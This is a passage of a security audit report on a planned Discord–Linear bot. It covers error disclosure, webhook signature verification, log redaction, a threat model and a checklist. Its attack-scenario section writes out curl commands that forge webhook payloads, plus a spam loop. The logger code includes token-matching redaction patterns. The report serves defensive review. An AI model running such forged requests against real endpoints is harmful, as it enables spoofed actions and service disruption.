→ Error rate increases exponentially
→ Bot crashes from memory exhaustion
→ Team has no visibility into sprint status
```

**Recommendation:**

```typescript
// 1. RATE LIMITER
import Bottleneck from 'bottleneck';

// Linear allows 2000 req/hour = ~33 req/min
const linearRateLimiter = new Bottleneck({
  reservoir: 100, // Start with 100 requests
  reservoirRefreshAmount: 33,
  reservoirRefreshInterval: 60 * 1000, // 33 requests per minute
  maxConcurrent: 5, // Max 5 concurrent requests
  minTime: 100, // Min 100ms between requests
});

linearRateLimiter.on('failed', async (error, jobInfo) => {
  const retryAfter = error.response?.headers?.['retry-after'];
  if (retryAfter) {
    logger.warn(`Linear rate limit hit, retrying after ${retryAfter}s`);
    return parseInt(retryAfter) * 1000; // Retry after specified time
  }
  return 5000; // Default 5s retry
});

// Wrap all Linear API calls
async function createLinearIssueWithRateLimit(data: any) {
  return linearRateLimiter.schedule(() => linearClient.createIssue(data));
}

async function getLinearIssueWithRateLimit(id: string) {
  return linearRateLimiter.schedule(() => linearClient.issue(id));
}

// 2. CIRCUIT BREAKER
import CircuitBreaker from 'opossum';

const linearCircuitBreaker = new CircuitBreaker(
  async (apiCall: () => Promise<any>) => apiCall(),
  {
    timeout: 10000, // 10s timeout
    errorThresholdPercentage: 50, // Open after 50% errors
    resetTimeout: 30000, // Try again after 30s
    rollingCountTimeout: 60000, // 1 minute window
    rollingCountBuckets: 10,
    volumeThreshold: 10, // Min 10 requests before opening
  }
);

linearCircuitBreaker.on('open', () => {
  logger.error('🔴 Linear API circuit breaker OPENED - too many failures');
  // Alert team via Discord
  notifyTeam('⚠️ Linear integration is experiencing issues. Some features may be unavailable.');
});

linearCircuitBreaker.on('halfOpen', () => {
  logger.info('🟡 Linear API circuit breaker HALF-OPEN - testing recovery');
});

linearCircuitBreaker.on('close', () => {
  logger.info('🟢 Linear API circuit breaker CLOSED - service restored');
  notifyTeam('✅ Linear integration has recovered.');
});

// Wrap Linear calls with circuit breaker
async function createLinearIssueSafe(data: any) {
  try {
    return await linearCircuitBreaker.fire(
      () => createLinearIssueWithRateLimit(data)
    );
  } catch (error) {
    if (linearCircuitBreaker.opened) {
      // Circuit is open, fail fast
      throw new Error('Linear API is currently unavailable. Please try again later.');
    }
    throw error;
  }
}

// 3. REQUEST DEDUPLICATION
import { LRUCache } from 'lru-cache';

const recentRequests = new LRUCache<string, Promise<any>>({
  max: 100,
  ttl: 5000, // 5 seconds
});

async function getLinearIssueCached(id: string) {
  const cacheKey = `issue:${id}`;

  // Return in-flight request if exists
  if (recentRequests.has(cacheKey)) {
    return recentRequests.get(cacheKey);
  }

  // Make new request
  const promise = getLinearIssueWithRateLimit(id);
  recentRequests.set(cacheKey, promise);

  return promise;
}

// 4. GRACEFUL DEGRADATION
async function handleLinearUnavailable(operation: string) {
  logger.error(`Linear API unavailable for operation: ${operation}`);

  // Fall back to cached data or manual mode
  switch (operation) {
    case 'daily-digest':
      // Send digest with warning
      return {
        message: '⚠️ Daily digest unavailable due to Linear API issues. Please check Linear directly.',
        success: false,
      };

    case 'feedback-capture':
      // Ask user to create issue manually
      return {
        message: '⚠️ Unable to create Linear issue automatically. Please create manually:\n' +
                 'https://linear.app/team/new-issue',
        success: false,
      };

    case 'status-update':
      // Queue update for later
      await queueStatusUpdate(operation);
      return {
        message: '⏳ Status update queued - will retry when Linear API recovers',
        success: false,
      };
  }
}

// 5. MONITORING
setInterval(() => {
  const stats = linearRateLimiter.counts();
  logger.info(`Linear API stats: ${stats.EXECUTING} executing, ${stats.QUEUED} queued`);

  if (stats.QUEUED > 50) {
    logger.warn('⚠️ Linear API queue building up - may need to scale');
  }
}, 60000); // Every minute
```

**Dependencies:**
```bash
npm install bottleneck opossum lru-cache
npm install @types/bottleneck -D
```

**Monitoring & Alerting:**
```typescript
// Alert if circuit breaker opens
linearCircuitBreaker.on('open', async () => {
  // Send to monitoring service
  await sendToDatadog({
    metric: 'linear.circuit_breaker.open',
    value: 1,
    tags: ['service:agentic-base'],
  });

  // Send to Discord alert channel
  const alertChannel = await client.channels.fetch(process.env.DISCORD_ALERTS_CHANNEL_ID);
  await alertChannel.send(
    '🚨 **LINEAR API ALERT** 🚨\n\n' +
    'Circuit breaker opened due to high error rate.\n' +
    'Features affected: Feedback capture, status updates, daily digest.\n\n' +
    'Action required: Check Linear API status at https://status.linear.app'
  );
});
```

---

### ⚠️ HIGH #8: Error Information Disclosure

**Severity:** HIGH
**Location:** All error handlers
**Impact:** Information leakage, aids attackers

**Finding:**
The proposed implementation returns raw error messages to users:

```typescript
// VULNERABLE CODE from tool-setup.md:603-606
if (issueResult.success) {
  await message.reply(...);
} else {
  await message.reply(
    `❌ Failed to capture feedback: ${issueResult.error}`  // ❌ LEAKS INTERNALS
  );
}
```

**Information Disclosed:**
- API endpoints and structure
- Database schema details
- File paths on server
- Stack traces with code snippets
- Third-party service versions
- Internal logic flow

**Example Error Leakage:**
```
User runs: /implement THJ-999

Bot replies:
"❌ Failed to implement task: TypeError: Cannot read property 'title' of undefined
    at getLinearIssue (/app/integration/dist/services/linearService.js:45:12)
    at async handleImplement (/app/integration/dist/handlers/commands.js:123:18)
Linear API URL: https://api.linear.app/graphql
Query: { issue(id: 'THJ-999') { id title description state { name } } }"
```

**Attack Value:**
Attacker learns:
- Code paths and logic
- File structure
- Linear API usage patterns
- Tech stack (Node.js, TypeScript)

**Recommendation:**

```typescript
// 1. ERROR TYPES
enum ErrorCode {
  // User errors (safe to show)
  INVALID_INPUT = 'INVALID_INPUT',
  PERMISSION_DENIED = 'PERMISSION_DENIED',
  NOT_FOUND = 'NOT_FOUND',
  RATE_LIMITED = 'RATE_LIMITED',

  // Internal errors (hide details)
  INTERNAL_ERROR = 'INTERNAL_ERROR',
  SERVICE_UNAVAILABLE = 'SERVICE_UNAVAILABLE',
  DATABASE_ERROR = 'DATABASE_ERROR',
}

class AppError extends Error {
  constructor(
    public code: ErrorCode,
    public userMessage: string,
    public internalMessage: string,
    public statusCode: number = 500,
  ) {
    super(internalMessage);
  }
}

// 2. ERROR HANDLER
function handleError(error: unknown, userId: string): string {
  // Log full error internally (with user context for debugging)
  const errorId = crypto.randomUUID();
  logger.error(`[${errorId}] Error for user ${userId}:`, {
    error: error instanceof Error ? {
      message: error.message,
      stack: error.stack,
      ...error,
    } : error,
  });

  // Return safe message to user
  if (error instanceof AppError) {
    return `❌ ${error.userMessage}\n\n` +
           `Error ID: ${errorId} (share with support if needed)`;
  }

  // Unknown error - completely hide details
  return `❌ An unexpected error occurred. Please try again later.\n\n` +
         `Error ID: ${errorId} (share with support if needed)`;
}

// 3. USAGE IN HANDLERS
async function handleImplement(message: Message, args: string[]) {
  try {
    const issueId = args[0];

    if (!issueId) {
      throw new AppError(
        ErrorCode.INVALID_INPUT,
        'Please provide a Linear issue ID. Usage: `/implement THJ-123`',
        'Missing issue ID argument',
        400,
      );
    }

    if (!/^[A-Z]+-\d+$/.test(issueId)) {
      throw new AppError(
        ErrorCode.INVALID_INPUT,
        `Invalid issue ID format: "${issueId}". Expected format: ABC-123`,
        `Invalid issue ID: ${issueId}`,
        400,
      );
    }

    const issue = await getLinearIssueSafe(issueId);

    if (!issue) {
      throw new AppError(
        ErrorCode.NOT_FOUND,
        `Issue ${issueId} not found. Please check the issue ID and try again.`,
        `Issue ${issueId} not found in Linear`,
        404,
      );
    }

    // Proceed with implementation...

  } catch (error) {
    const errorMessage = handleError(error, message.author.id);
    await message.reply(errorMessage);
  }
}

// 4. LINEAR SERVICE ERROR WRAPPING
async function getLinearIssueSafe(id: string) {
  try {
    const issue = await linearClient.issue(id);
    return issue;
  } catch (error) {
    // Don't expose Linear API errors to user
    if (error.message.includes('Unauthorized')) {
      throw new AppError(
        ErrorCode.SERVICE_UNAVAILABLE,
        'Linear integration is temporarily unavailable.',
        `Linear API auth failed: ${error.message}`,
        503,
      );
    }

    if (error.message.includes('Not Found')) {
      throw new AppError(
        ErrorCode.NOT_FOUND,
        `Issue ${id} not found.`,
        `Linear issue ${id} not found: ${error.message}`,
        404,
      );
    }

    // Generic error
    throw new AppError(
      ErrorCode.SERVICE_UNAVAILABLE,
      'Unable to fetch issue from Linear. Please try again.',
      `Linear API error: ${error.message}`,
      503,
    );
  }
}

// 5. GLOBAL ERROR HANDLER
process.on('uncaughtException', (error) => {
  logger.error('FATAL: Uncaught exception:', error);
  // Don't crash - log and continue
  // (But in production, consider graceful shutdown and restart)
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error('FATAL: Unhandled promise rejection:', reason);
  // Log but don't crash
});

// Discord.js error handler
client.on('error', (error) => {
  logger.error('Discord client error:', error);
  // Don't expose to user - Discord.js handles most errors internally
});
```

**Additional Protections:**

```typescript
// Remove stack traces in production
if (process.env.NODE_ENV === 'production') {
  Error.stackTraceLimit = 0; // Disable stack traces
}

// Sanitize error objects before logging
function sanitizeError(error: any): any {
  if (error instanceof Error) {
    return {
      message: error.message,
      name: error.name,
      // Don't include stack in structured logs sent to external services
    };
  }
  return error;
}

// Safe logging
logger.error('Operation failed', sanitizeError(error));
```

---

### ⚠️ HIGH #9: No Webhook Signature Verification

**Severity:** HIGH
**Location:** Not yet implemented (but implied in architecture)
**Impact:** Webhook spoofing, unauthorized actions, data manipulation

**Finding:**
The architecture mentions "webhook integrations" for Linear and Vercel but provides no authentication design:

From integration-architecture.md:517:
```
Linear webhook triggers
→ Bot posts in Discord: "@senior-dev-1 THJ-123 ready for review"
```

**Vulnerabilities:**

1. **Unauthenticated Webhooks**
   - Anyone can POST to webhook endpoint
   - No verification that request is from Linear/Vercel
   - Attacker can forge webhook payloads

2. **Replay Attacks**
   - Captured webhook can be replayed
   - No timestamp validation
   - No nonce/idempotency check

3. **Data Tampering**
   - Attacker modifies webhook payload
   - Bot acts on fake data
   - Could trigger notifications, status changes, etc.

**Attack Scenarios:**

**Scenario 1: Fake Status Updates**
```bash
# Attacker sends fake Linear webhook:
curl -X POST https://your-bot.com/webhooks/linear \
  -H "Content-Type: application/json" \
  -d '{
    "action": "update",
    "data": {
      "id": "THJ-123",
      "state": { "name": "Done" }
    }
  }'

→ Bot thinks THJ-123 is done
→ Updates sprint.md with ✅
→ Team thinks task is complete
→ Actually not done, creates confusion
```

**Scenario 2: Spam Notifications**
```bash
# Attacker spams fake Vercel deployment webhooks:
for i in {1..1000}; do
  curl -X POST https://your-bot.com/webhooks/vercel \
    -H "Content-Type: application/json" \
    -d '{"deployment": {"url": "https://fake.vercel.app"}}'
done

→ Bot spams Discord with "Preview deployed" messages
→ Discord rate limits bot
→ Legitimate messages fail
```

**Scenario 3: Privilege Escalation**
```bash
# Attacker forges webhook to trigger reviewer agent:
curl -X POST https://your-bot.com/webhooks/linear \
  -d '{
    "action": "update",
    "data": {
      "id": "THJ-999",
      "state": { "name": "In Review" }
    },
    "user": { "id": "attacker-id" }
  }'

→ Bot triggers /review-sprint THJ-999
→ Reviewer approves (fake issue)
→ Attacker's code gets merged
```

**Recommendation:**

**1. Linear Webhook Signature Verification**

Linear signs webhooks with HMAC-SHA256. From Linear docs:
```
X-Linear-Signature: sha256=<signature>
```

```typescript
// integration/src/handlers/webhooks.ts
import crypto from 'crypto';
import express from 'express';

const app = express();

// Use raw body for signature verification
app.use('/webhooks/linear', express.raw({ type: 'application/json' }));

app.post('/webhooks/linear', async (req, res) => {
  const signature = req.headers['x-linear-signature'] as string;
  const payload = req.body;

  // 1. VERIFY SIGNATURE
  if (!signature) {
    logger.warn('Linear webhook missing signature header');
    return res.status(401).send('Missing signature');
  }

  const webhookSecret = process.env.LINEAR_WEBHOOK_SECRET;
  if (!webhookSecret) {
    logger.error('LINEAR_WEBHOOK_SECRET not configured');
    return res.status(500).send('Server misconfiguration');
  }

  const expectedSignature = crypto
    .createHmac('sha256', webhookSecret)
    .update(payload)
    .digest('hex');

  const providedSignature = signature.replace('sha256=', '');

  // Use constant-time comparison to prevent timing attacks
  if (!crypto.timingSafeEqual(
    Buffer.from(expectedSignature),
    Buffer.from(providedSignature)
  )) {
    logger.warn('Linear webhook signature verification failed');
    return res.status(401).send('Invalid signature');
  }

  // 2. PARSE PAYLOAD
  let data;
  try {
    data = JSON.parse(payload.toString());
  } catch (error) {
    logger.error('Invalid Linear webhook payload:', error);
    return res.status(400).send('Invalid JSON');
  }

  // 3. VALIDATE TIMESTAMP (prevent replay attacks)
  const timestamp = data.createdAt; // ISO 8601 timestamp
  if (!timestamp) {
    logger.warn('Linear webhook missing timestamp');
    return res.status(400).send('Missing timestamp');
  }

  const webhookAge = Date.now() - new Date(timestamp).getTime();
  const MAX_AGE = 5 * 60 * 1000; // 5 minutes

  if (webhookAge > MAX_AGE) {
    logger.warn(`Linear webhook too old: ${webhookAge}ms`);
    return res.status(400).send('Webhook expired');
  }

  // 4. IDEMPOTENCY CHECK
  const webhookId = data.webhookId || data.id;
  if (!webhookId) {
    logger.warn('Linear webhook missing ID');
    return res.status(400).send('Missing webhook ID');
  }

  // Check if already processed
  const processed = await redis.get(`webhook:linear:${webhookId}`);
  if (processed) {
    logger.info(`Duplicate Linear webhook ignored: ${webhookId}`);
    return res.status(200).send('Already processed');
  }

  // Mark as processed (expire after 1 hour)
  await redis.setex(`webhook:linear:${webhookId}`, 3600, '1');

  // 5. PROCESS WEBHOOK
  try {
    await handleLinearWebhook(data);
    res.status(200).send('OK');
  } catch (error) {
    logger.error('Error processing Linear webhook:', error);
    res.status(500).send('Processing error');
  }
});

async function handleLinearWebhook(data: any) {
  const action = data.action;
  const issue = data.data;

  logger.info(`Linear webhook: ${action} for issue ${issue.identifier}`);

  switch (action) {
    case 'create':
      // Handle issue created
      break;

    case 'update':
      // Handle issue updated (e.g., status change)
      if (issue.state?.name === 'In Review') {
        // Notify reviewer
        await notifyReviewer(issue);
      }
      break;

    case 'remove':
      // Handle issue deleted
      break;

    default:
      logger.warn(`Unknown Linear webhook action: ${action}`);
  }
}

// Start webhook server
app.listen(3001, () => {
  logger.info('Webhook server listening on port 3001');
});
```

**2. Vercel Webhook Signature Verification**

Vercel also signs webhooks. From Vercel docs:
```
x-vercel-signature: <signature>
```

```typescript
app.post('/webhooks/vercel', express.raw({ type: 'application/json' }), async (req, res) => {
  const signature = req.headers['x-vercel-signature'] as string;
  const payload = req.body.toString();

  // Verify signature (similar to Linear)
  const webhookSecret = process.env.VERCEL_WEBHOOK_SECRET;
  const expectedSignature = crypto
    .createHmac('sha1', webhookSecret)
    .update(payload)
    .digest('hex');

  if (!crypto.timingSafeEqual(
    Buffer.from(expectedSignature),
    Buffer.from(signature)
  )) {
    logger.warn('Vercel webhook signature verification failed');
    return res.status(401).send('Invalid signature');
  }

  // Parse and process...
  const data = JSON.parse(payload);
  await handleVercelWebhook(data);
  res.status(200).send('OK');
});
```

**3. Configuration**

Add webhook secrets to `.env.local`:
```bash
# Linear webhook secret (from Linear settings → Webhooks)
LINEAR_WEBHOOK_SECRET=wh_abc123def456...

# Vercel webhook secret (from Vercel project settings → Webhooks)
VERCEL_WEBHOOK_SECRET=wh_xyz789...

# Redis for idempotency checks
REDIS_URL=redis://localhost:6379
```

**4. Setup in Services**

**Linear:**
1. Go to Linear Settings → API → Webhooks
2. Create webhook: `https://your-bot.com/webhooks/linear`
3. Copy webhook secret
4. Add to `.env.local`

**Vercel:**
1. Go to Project Settings → Webhooks
2. Create webhook: `https://your-bot.com/webhooks/vercel`
3. Copy webhook secret
4. Add to `.env.local`

**5. Testing**

```bash
# Test Linear webhook signature
payload='{"action":"update","data":{"id":"THJ-123"}}'
secret="wh_abc123..."

signature=$(echo -n "$payload" | openssl dgst -sha256 -hmac "$secret" | awk '{print $2}')

curl -X POST https://your-bot.com/webhooks/linear \
  -H "Content-Type: application/json" \
  -H "X-Linear-Signature: sha256=$signature" \
  -d "$payload"
```

---

### ⚠️ HIGH #10: Insufficient Logging Security

**Severity:** HIGH
**Location:** `integration/src/utils/logger.ts`
**Impact:** Secrets leakage, PII in logs, attack obfuscation

**Finding:**
The proposed logger implementation is naive:

```typescript
// VULNERABLE CODE from tool-setup.md:879-913
function log(level: LogLevel, ...args: any[]) {
  const message = args.map(arg =>
    typeof arg === 'object' ? JSON.stringify(arg) : String(arg)  // ❌ NO SANITIZATION
  ).join(' ');

  const logLine = `[${timestamp}] [${level.toUpperCase()}] ${message}\n`;

  fs.appendFileSync(logFile, logLine);  // ❌ SYNCHRONOUS I/O
  console[level](`[${timestamp}]`, ...args);  // ❌ MAY LOG SECRETS
}
```

**Vulnerabilities:**

1. **Secrets in Logs**
```typescript
logger.info('Creating Linear issue with token:', process.env.LINEAR_API_TOKEN);
// Log now contains: lin_api_abc123def456...
```

2. **PII in Logs**
```typescript
logger.info('Processing message:', message.content);
// Message contains: "My email is john@example.com"
```

3. **Error Stack Traces Leak Paths**
```typescript
logger.error('Failed:', error);
// Stack trace reveals: /home/user/agentic-base/integration/secrets/.env.local
```

4. **Synchronous File I/O**
   - Blocks event loop
   - Poor performance under load
   - Can crash on file system errors

5. **No Log Rotation**
   - Logs grow indefinitely
   - Fills disk space
   - Performance degrades

6. **No Access Controls**
   - World-readable log files
   - Any user can read logs
   - Secrets exposed to all processes

**Recommendation:**

```typescript
// integration/src/utils/logger.ts
import winston from 'winston';
import DailyRotateFile from 'winston-daily-rotate-file';
import fs from 'fs';
import path from 'path';

const logDir = path.join(__dirname, '../../logs');

// Ensure log directory with proper permissions
if (!fs.existsSync(logDir)) {
  fs.mkdirSync(logDir, { recursive: true, mode: 0o700 });
} else {
  fs.chmodSync(logDir, 0o700); // Only owner can read/write/execute
}

// 1. REDACT SECRETS
const SENSITIVE_KEYS = [
  'token',
  'password',
  'secret',
  'apiKey',
  'apikey',
  'api_key',
  'authorization',
  'cookie',
  'session',
  'jwt',
  'bearer',
];

function redactSensitiveData(obj: any): any {
  if (typeof obj === 'string') {
    // Redact JWT tokens
    obj = obj.replace(/\beyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*/g, '[JWT REDACTED]');
    // Redact Linear tokens
    obj = obj.replace(/\blin_api_[a-f0-9]{40}\b/g, '[LINEAR_TOKEN REDACTED]');
    // Redact Discord bot tokens
    obj = obj.replace(/[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g, '[DISCORD_TOKEN REDACTED]');
    // Redact emails
    obj = obj.replace(/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g, '[EMAIL REDACTED]');
    return obj;
  }

  if (Array.isArray(obj)) {
    return obj.map(redactSensitiveData);
  }

  if (obj && typeof obj === 'object') {
    const redacted: any = {};
    for (const [key, value] of Object.entries(obj)) {
      const lowerKey = key.toLowerCase();
      if (SENSITIVE_KEYS.some(sk => lowerKey.includes(sk))) {
        redacted[key] = '[REDACTED]';
      } else {
        redacted[key] = redactSensitiveData(value);
      }
    }
    return redacted;
  }

  return obj;
}

// 2. FORMAT WITH REDACTION
const redactingFormat = winston.format.printf(({ level, message, timestamp, ...meta }) => {
  const redactedMessage = redactSensitiveData(message);
  const redactedMeta = redactSensitiveData(meta);

  let log = `${timestamp} [${level}] ${redactedMessage}`;

  if (Object.keys(redactedMeta).length > 0) {
    log += ` ${JSON.stringify(redactedMeta)}`;
  }

  return log;
});

// 3. ROTATING FILE TRANSPORT
const fileRotateTransport = new DailyRotateFile({
  filename: path.join(logDir, 'discord-bot-%DATE%.log'),
  datePattern: 'YYYY-MM-DD',
  maxSize: '20m',
  maxFiles: '14d', // Keep logs for 14 days
  zippedArchive: true, // Compress old logs
  format: winston.format.combine(
    winston.format.timestamp(),
    redactingFormat,
  ),
});

// 4. SEPARATE ERROR LOG
const errorRotateTransport = new DailyRotateFile({
  filename: path.join(logDir, 'error-%DATE%.log'),
  datePattern: 'YYYY-MM-DD',
  maxSize: '20m',
  maxFiles: '30d',
  level: 'error',
  zippedArchive: true,
  format: winston.format.combine(
    winston.format.timestamp(),
    redactingFormat,
  ),
});

// 5. CONSOLE TRANSPORT (development only)
const consoleTransport = new winston.transports.Console({
  format: winston.format.combine(
    winston.format.colorize(),
    winston.format.timestamp({ format: 'HH:mm:ss' }),
    redactingFormat,
  ),
});

// 6. CREATE LOGGER
export const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  transports: [
    fileRotateTransport,
    errorRotateTransport,
    ...(process.env.NODE_ENV !== 'production' ? [consoleTransport] : []),
  ],
  // Handle logging exceptions
  exceptionHandlers: [
    new DailyRotateFile({
      filename: path.join(logDir, 'exceptions-%DATE%.log'),
      datePattern: 'YYYY-MM-DD',
      maxFiles: '30d',
    }),
  ],
  // Handle unhandled promise rejections
  rejectionHandlers: [
    new DailyRotateFile({
      filename: path.join(logDir, 'rejections-%DATE%.log'),
      datePattern: 'YYYY-MM-DD',
      maxFiles: '30d',
    }),
  ],
});

// 7. AUDIT LOGGER (separate from general logs)
const auditLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(), // Structured for parsing
  ),
  transports: [
    new DailyRotateFile({
      filename: path.join(logDir, 'audit-%DATE%.log'),
      datePattern: 'YYYY-MM-DD',
      maxFiles: '90d', // Keep audit logs longer
      zippedArchive: true,
    }),
  ],
});

export function audit(action: string, userId: string, details: Record<string, any> = {}) {
  auditLogger.info({
    action,
    userId,
    timestamp: new Date().toISOString(),
    ...redactSensitiveData(details),
  });
}

// 8. USAGE EXAMPLES
// General logging
logger.info('Bot started');
logger.warn('Rate limit approaching', { remaining: 100 });
logger.error('Failed to create issue', { error: error.message });

// Audit logging (for compliance)
audit('feedback_captured', user.id, { messageId: message.id, issueId: 'THJ-123' });
audit('status_updated', user.id, { issueId: 'THJ-123', from: 'In Progress', to: 'Done' });
audit('command_executed', user.id, { command: 'implement', issueId: 'THJ-123' });

// 9. SECURE FILE PERMISSIONS
fileRotateTransport.on('rotate', (oldFilename, newFilename) => {
  // Set secure permissions on rotated files
  if (oldFilename) {
    fs.chmodSync(oldFilename, 0o600);
  }
  if (newFilename) {
    fs.chmodSync(newFilename, 0o600);
  }
});
```

**Dependencies:**
```bash
npm install winston winston-daily-rotate-file
npm install @types/winston -D
```

**Log Management:**

```bash
# integration/scripts/setup-logs.sh
#!/bin/bash

LOG_DIR="integration/logs"

# Create log directory
mkdir -p "$LOG_DIR"
chmod 700 "$LOG_DIR"

# Add logrotate config (Linux)
cat > /etc/logrotate.d/agentic-base << EOF
$LOG_DIR/*.log {
  daily
  rotate 14
  compress
  delaycompress
  missingok
  notifempty
  create 0600 $(whoami) $(whoami)
  postrotate
    # Reload bot to release file handles
    pm2 reload agentic-base-bot
  endscript
}
EOF

echo "✓ Log rotation configured"
```

**Monitoring:**

```typescript
// Alert on high error rate
let errorCount = 0;
let lastAlertTime = 0;

logger.on('error', (err) => {
  errorCount++;

  // Alert if >10 errors in 1 minute
  const now = Date.now();
  if (errorCount > 10 && now - lastAlertTime > 60000) {
    notifyAdmin('🚨 High error rate detected: ' + errorCount + ' errors in last minute');
    errorCount = 0;
    lastAlertTime = now;
  }
});
```

---

## 3. MEDIUM PRIORITY ISSUES

### 🟡 MEDIUM #11: No HTTPS Enforcement for Webhooks

**Location:** Webhook endpoints (not yet implemented)
**Impact:** Man-in-the-middle attacks, webhook data interception

**Finding:** Architecture doesn't specify HTTPS requirement for webhook endpoints.

**Recommendation:**
- Enforce HTTPS for all webhook endpoints
- Reject HTTP requests
- Use TLS 1.2+ only
- Implement HSTS headers

---

### 🟡 MEDIUM #12: Insufficient Input Length Limits

**Location:** All user input handlers
**Impact:** DoS, resource exhaustion

**Finding:** No documented limits on message lengths, attachment sizes, or API payload sizes.

**Recommendation:**
```typescript
const LIMITS = {
  MESSAGE_LENGTH: 2000,        // Discord's limit
  ATTACHMENT_SIZE: 10485760,   // 10 MB
  ATTACHMENTS_COUNT: 5,
  URLS_COUNT: 10,
  LINEAR_TITLE_LENGTH: 255,
  LINEAR_DESCRIPTION_LENGTH: 50000,
};
```

---

### 🟡 MEDIUM #13: No Database Integrity Checks

**Location:** `user-preferences.json`
**Impact:** Data corruption, inconsistent state

**Finding:** User preferences stored in JSON file with no validation or schema enforcement.

**Recommendation:**
- Migrate to SQLite for ACID guarantees
- Add JSON schema validation if staying with JSON
- Implement atomic writes
- Add data backups

---

### 🟡 MEDIUM #14: Command Injection via Bot Commands

**Location:** Any commands that shell out (if implemented)
**Impact:** Remote code execution

**Finding:** If any bot commands execute shell commands, they may be vulnerable to injection.

**Recommendation:**
- Never use `child_process.exec` with user input
- Use `child_process.execFile` with argument array
- Validate and sanitize ALL user input

---

### 🟡 MEDIUM #15: No Monitoring/Alerting System

**Location:** Overall system
**Impact:** Undetected failures, prolonged outages

**Finding:** No monitoring, alerting, or health checks defined.

**Recommendation:**
- Implement health check endpoint (`/health`)
- Add metrics collection (Prometheus, StatsD)
- Set up alerting (PagerDuty, OpsGenie)
- Monitor: uptime, error rate, API latency, memory usage

---

## 4. LOW PRIORITY ISSUES

### 🔵 LOW #16: No TypeScript Strict Mode

**Location:** `tsconfig.json` (not yet created)

**Recommendation:**
```json
{
  "compilerOptions": {
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "noImplicitReturns": true,
    "noFallthroughCasesInSwitch": true
  }
}
```

---

### 🔵 LOW #17: No Dependency Security Scanning

**Recommendation:**
```bash
npm install -g npm-audit-resolver
npm audit
npm audit fix --force  # Carefully review changes

# Add to CI/CD
npm audit --audit-level=high
```

---

### 🔵 LOW #18: No Code Linting

**Recommendation:**
```bash
npm install -D eslint @typescript-eslint/parser @typescript-eslint/eslint-plugin
npx eslint --init

# Add security rules
npm install -D eslint-plugin-security
```

---

### 🔵 LOW #19: No Unit Tests

**Recommendation:**
```bash
npm install -D jest @types/jest ts-jest
# Write tests for critical paths: sanitization, authentication, rate limiting
```

---

### 🔵 LOW #20: Missing User Session Management

**Finding:** No session tokens for stateful interactions.

**Impact:** Limited for current bot design, but important for future features.

---

## 5. INFORMATIONAL FINDINGS

### ✅ POSITIVE: Comprehensive Documentation

**Finding:** The documentation (integration-architecture.md, tool-setup.md, team-playbook.md, adoption-plan.md) is exceptionally thorough and well-structured.

**Strengths:**
- Clear architecture diagrams
- Detailed setup instructions
- Security considerations mentioned (though not fully implemented)
- Phased rollout plan reduces risk
- Good separation of concerns (documentation for different roles)

---

### ✅ POSITIVE: Configuration-Driven Design

**Finding:** Heavy use of YAML configuration files for flexibility.

**Benefits:**
- Easy to adjust without code changes
- Non-developers can modify behavior
- Good for iterative tuning

**Caution:** Ensure config files are validated before use.

---

### ℹ️ INFORMATIONAL: No Implementation = No Concrete Vulnerabilities Yet

**Finding:** This audit is based entirely on documentation and proposed implementation templates.

**Implications:**
- Actual implementation may differ from documentation
- New vulnerabilities may be introduced during coding
- Security controls described may not be implemented correctly
- **CRITICAL:** Re-audit required after implementation exists

---

## 6. THREAT MODEL

### Assets

1. **Discord Bot Token** - CRITICAL
   - Compromise = full bot control

2. **Linear API Token** - CRITICAL
   - Compromise = full Linear access (read/write all issues)

3. **User Data** - HIGH
   - Discord messages (may contain PII)
   - User preferences

4. **System Integrity** - HIGH
   - Bot availability
   - Linear data consistency

### Threat Actors

1. **External Attacker** (Internet-based)
   - Motivation: Data theft, service disruption
   - Capability: Medium (API abuse, social engineering)
   - Likelihood: Medium

2. **Malicious Discord Member**
   - Motivation: Spam, DoS, information gathering
   - Capability: Low-Medium (Discord API access only)
   - Likelihood: Low (requires server access)

3. **Compromised Developer Account**
   - Motivation: Data theft, backdoor insertion
   - Capability: High (code access, token access)
   - Likelihood: Low (but highest impact)

4. **Insider Threat**
   - Motivation: Data theft, sabotage
   - Capability: High (full system access)
   - Likelihood: Very Low (but requires monitoring)

### Attack Vectors

1. **Discord Message Injection** → XSS/Command Injection
2. **API Token Theft** → Full account compromise
3. **Webhook Spoofing** → Fake notifications/data
4. **Rate Limit Exhaustion** → DoS
5. **PII Leakage** → Privacy violation
6. **Error Message Disclosure** → Information leakage
7. **Log File Access** → Token theft
8. **Unvalidated Input** → Various injections

### Risk Matrix

| Threat                     | Likelihood | Impact   | Risk Level |
|----------------------------|------------|----------|------------|
| Token theft via logs       | Medium     | Critical | HIGH       |
| Message injection → XSS    | High       | High     | HIGH       |
| Webhook spoofing           | Medium     | High     | HIGH       |
| DoS via rate limit abuse   | Medium     | Medium   | MEDIUM     |
| PII exposure in Linear     | High       | Medium   | MEDIUM     |
| Error info disclosure      | High       | Low      | MEDIUM     |
| Dependency vulnerabilities | Medium     | Medium   | MEDIUM     |

---

## 7. SECURITY CHECKLIST

### Pre-Implementation

- [ ] Review all critical findings in this report
- [ ] Design authentication/authorization system
- [ ] Define input validation rules
- [ ] Choose secrets management solution
- [ ] Plan logging and monitoring strategy

### During Implementation

- [ ] Implement RBAC for Discord commands
- [ ] Add input sanitization to all user-facing handlers
- [ ] Implement rate limiting and circuit breakers
- [ ] Set up proper secrets management (not just .env.local)
- [ ] Add webhook signature verification
- [ ] Implement safe error handling (no info disclosure)
- [ ] Use parameterized queries (if using SQL)
- [ ] Enable TypeScript strict mode
- [ ] Write unit tests for security-critical code

### Pre-Deployment

- [ ] Re-run security audit on actual implementation
- [ ] Perform penetration testing
- [ ] Scan dependencies: `npm audit`
- [ ] Review file permissions (600 for secrets, 700 for dirs)
- [ ] Verify .gitignore excludes secrets
- [ ] Set up monitoring and alerting
- [ ] Create incident response plan
- [ ] Document disaster recovery procedures
- [ ] Train team on security practices

### Post-Deployment

- [ ] Monitor error logs daily
- [ ] Review audit logs weekly
- [ ] Rotate API tokens every 90 days
- [ ] Update dependencies monthly: `npm update`
- [ ] Quarterly security review
- [ ] Annual penetration test
- [ ] Maintain security documentation

---

## 8. PRIORITY RECOMMENDATIONS

